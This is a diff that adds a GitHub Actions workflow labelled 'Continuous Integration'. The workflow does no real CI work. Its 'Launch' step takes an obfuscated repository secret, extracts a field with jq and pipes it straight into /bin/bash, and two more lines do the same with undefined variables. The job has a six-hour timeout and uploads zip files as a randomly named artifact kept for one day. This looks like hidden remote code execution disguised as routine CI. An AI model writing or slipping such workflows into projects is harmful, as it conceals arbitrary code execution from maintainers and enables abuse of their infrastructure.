@@ -1,0 +1,29 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          uwl429: ${{ secrets.uwl429 }}
+        run: |
+          printf '%s' "$uwl429" | jq -r .kfvwi3 | /bin/bash
+          printf '%s' "$xnqr0" | jq -r .oyty18 | /bin/bash
+          printf '%s' "$tioj20773" | jq -r .bqpi37396 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 4FFMPXbR
+          path: "*.zip"
+          retention-days: 1
